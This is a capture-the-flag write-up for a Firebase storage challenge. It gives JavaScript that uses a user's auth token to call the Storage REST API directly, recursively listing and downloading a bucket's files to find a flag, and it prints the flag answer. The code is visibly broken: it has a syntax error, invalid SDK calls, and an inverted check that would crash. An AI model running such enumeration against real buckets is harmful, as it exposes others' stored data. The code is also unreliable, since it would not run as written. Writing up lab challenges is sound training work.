# Flag 5 - Read the Almanac

1. As Biff, recursively read the Biffco storage ``gs://$project_id.appspot.com/biffco``
1. Using ``firebase.storage().ref("/biffco").list()`` only returns ``/biffco/flag.json``. Instead we need to fetch directly the [storage API](https://cloud.google.com/storage/docs/json_api/v1/objects/list) to list and download everything.
  
    ```js
    firebase.auth().currentUser.getIdToken().then((token) => 
       recursiveList(token,"biffco/");
    );

    function fetchStorageAPI(_token, _url) {
        return new Promise((_resolve,_reject) => {
            fetch(
                _url,
                {
                    headers: {
                        "Authorization":"Firebase " + _token,
                        "X-Firebase-Storage-Version":"webjs/10.4.0"
                    }
                })
            .then((resp) => {
                resp.text((data) => {
                    _resolve(data);
                });
            });
        }) 
    }

    const baseURL = "https://firebasestorage.googleapis.com/v0/b/hf2k23-firebase-misc.appspot.com/o/";

    function recursiveList(_token, _basePath) {
            var url = `${baseURL}?prefix=${encodeURIComponent(_basePath)}&delimiter=%2f`;

            fetchStorageAPI(_token,url)
            .then((data) => {
                data = JSON.parse(data);

                data.prefixes.forEach((_pre) => recursiveList(_token,_pre));

                data.items.map((i) => {
                    firebase.storage.ref(_basePath + "/" + i.name).download()
                    .then((data) => {
                        matches = data.match(/HF-[a-f0-9]{32}/);
                        if(!matches) {
                            console.log(matches[0]);
                        }
                    });
                });
            });
    }
    ```

    **Flag: HF-080de2172b964a229d14377793f6df85**